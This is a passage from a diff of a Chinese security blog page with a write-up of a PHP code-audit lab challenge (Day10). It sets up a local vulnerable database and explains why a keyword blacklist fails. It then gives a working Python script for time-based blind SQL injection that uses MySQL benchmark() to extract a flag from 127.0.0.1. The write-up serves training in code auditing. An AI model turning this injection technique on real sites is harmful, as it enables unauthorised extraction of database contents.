class="subst">&#123;$row['score']&#125;</span> |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">"你所查询的对象id值不能为空！"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$password = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"day10"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 搭建CTF环境使用的sql语句</span><br><span class="line">create database day10;</span><br><span class="line">use day10;</span><br><span class="line">create table students (</span><br><span class="line">id int(6) unsigned auto_increment primary key,</span><br><span class="line">name varchar(20) not null,</span><br><span class="line">email varchar(30) not null,</span><br><span class="line">score int(8) unsigned not null );</span><br><span class="line"></span><br><span class="line">INSERT INTO students VALUES(1,&apos;Lucia&apos;,&apos;Lucia@hongri.com&apos;,100);</span><br><span class="line">INSERT INTO students VALUES(2,&apos;Danny&apos;,&apos;Danny@hongri.com&apos;,59);</span><br><span class="line">INSERT INTO students VALUES(3,&apos;Alina&apos;,&apos;Alina@hongri.com&apos;,66);</span><br><span class="line">INSERT INTO students VALUES(4,&apos;Jameson&apos;,&apos;Jameson@hongri.com&apos;,13);</span><br><span class="line">INSERT INTO students VALUES(5,&apos;Allie&apos;,&apos;Allie@hongri.com&apos;,88);</span><br><span class="line"></span><br><span class="line">create table flag(flag varchar(30) not null);</span><br><span class="line">INSERT INTO flag VALUES(&apos;HRCTF&#123;tim3_blind_Sql&#125;&apos;);</span><br></pre></td></tr></table></figure>
+<p>搭建后的效果</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day10/2.png" alt=""></p>
+<p><strong>题目分析：</strong></p>
+<p>代码通过GET传入id参数，根据id值进行查询相应的学生姓名、邮箱和成绩，这里显然存在注入漏洞。</p>
+<p>但是查询之前id参数的值被stophack函数过滤了一遍，它将一些SQL语句的关键字替换成HongRi，并用strip_tags函数去掉空字符、HTML和PHP标记。但是问题在于在匹配替换关键字后程序并没有退出，所以程序会继续向下执行，被过滤后的id参数值仍然会被拼接到SQL语句中被执行。所以我们只要构造注入语句绕过它的黑名单就能执行注入攻击。</p>
+<p>纵观整个程序，当SQL语句执行出错时并不会将错误信息显示出来，所以这里显然只能进行盲注。显然开发也注意到了这个问题，所以他把盲注最重要的sleep函数也加入了黑名单过滤掉了。所以我们这里就需要一些骚姿势，也就是不利用sleep函数进行延时注入。</p>
+<p>这里我主要讲一下我要用的benchmark函数及逆行延时盲注。</p>
+<p>benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式。我们来看一个例子：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day10/3.png" alt=""></p>
+<p>这个例子很简单，就是执行7^3^8共200000000次，它的执行时间大约是2.74秒，所以我们可以用这个函数来达到延时的效果。</p>
+<p>下面直接贴一下注入脚本的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlagResult</span><span class="params">(i,j)</span>:</span></span><br><span class="line">    payload = <span class="string">"-1 or if(ascii(mid((select flag from flag),%s,1))&gt;=%s,benchmark(200000000,7^3^8),0)"</span> % (i,j)</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/PHP-Audit-Labs/DAY10/index.php?id=%s"</span> % payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url=url,timeout=<span class="number">2.7</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">22</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = (left + right)/<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> left&lt;right<span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">if</span> getFlagResult(i,mid) == <span class="keyword">True</span>:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right)/<span class="number">2</span></span><br><span class="line">    flag = flag + chr(left)</span><br><span class="line">    print(<span class="string">"[-] Try to get flag： %s"</span> % flag)</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day10/4.png" alt=""></p>
+<hr>
+<p><strong>参考链接：</strong></p>
+<p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day10/files/README.md" target="_blank" rel="noopener">[红日安全]代码审计Day10 - 程序未恰当exit导致的问题</a></p>
+<p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day9-12/files/README.md" target="_blank" rel="noopener">[红日安全]PHP-Audit-Labs题解之Day9-12</a></p>
+<p><a href="https://xz.aliyun.com/t/2288" target="_blank" rel="noopener">mysql 延时注入新思路</a></p>
+<hr>
+<div align="center"><br>    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33343594&auto=1&height=66"></iframe><br></div>
+
+
+
+
+
 
       
     </div>
@@ -413,13 +432,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/05/12/Easy-Unserialize-Writeup/">php反序列化组会例题和makerctf easy_unserialize的wp</a></p>
+        <p><span>本文标题:</span><a href="/2018/10/04/PHP-Audit-Labs-Day10/">PHP代码审计-程序为恰当使用exit导致的问题</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
-        <p><span>发布时间:</span>2018-05-12, 22:57:53</p>
-        <p><span>最后更新:</span>2018-07-23, 09:34:49</p>
+        <p><span>发布时间:</span>2018-10-04, 14:49:45</p>
+        <p><span>最后更新:</span>2018-10-08, 23:02:22</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/05/12/Easy-Unserialize-Writeup/" title="php反序列化组会例题和makerctf easy_unserialize的wp">http://yoursite.com/2018/05/12/Easy-Unserialize-Writeup/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/05/12/Easy-Unserialize-Writeup/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/10/04/PHP-Audit-Labs-Day10/" title="PHP代码审计-程序为恰当使用exit导致的问题">http://yoursite.com/2018/10/04/PHP-Audit-Labs-Day10/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/04/PHP-Audit-Labs-Day10/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -431,16 +450,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/05/17/Makerctf-Wp/">
-                    MakerCTF Write Up
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/05/01/ISCC-2018-web6/">
-                    ISCC-2018 web题&#34;SQL注入的艺术&#34; write up
+                <a href="/2018/10/03/PHP-Audit-Labs-Day9/">
+                    PHP代码审计-str_replace函数过滤不当
                 </a>
             </div>
         
@@ -452,7 +465,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#组会例题"><span class="toc-number">1.</span> <span class="toc-text">组会例题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#makerctf-easy-unserialize"><span class="toc-number">2.</span> <span class="toc-text">makerctf easy_unserialize</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DAY10-Anticipation"><span class="toc-number">1.</span> <span class="toc-text">DAY10-Anticipation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a></li></ol>
         
     </div>
     <style>
@@ -488,7 +501,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"php反序列化组会例题和makerctf easy_unserialize的wp　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"PHP代码审计-程序为恰当使用exit导致的问题　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -508,15 +521,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/05/17/Makerctf-Wp/" title="上一篇: MakerCTF Write Up">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/05/01/ISCC-2018-web6/" title="下一篇: ISCC-2018 web题&#34;SQL注入的艺术&#34; write up">
+            <a href="/2018/10/03/PHP-Audit-Labs-Day9/" title="下一篇: PHP代码审计-str_replace函数过滤不当">
                 <i class="fa fa-angle-right"></i>
             </a>
         
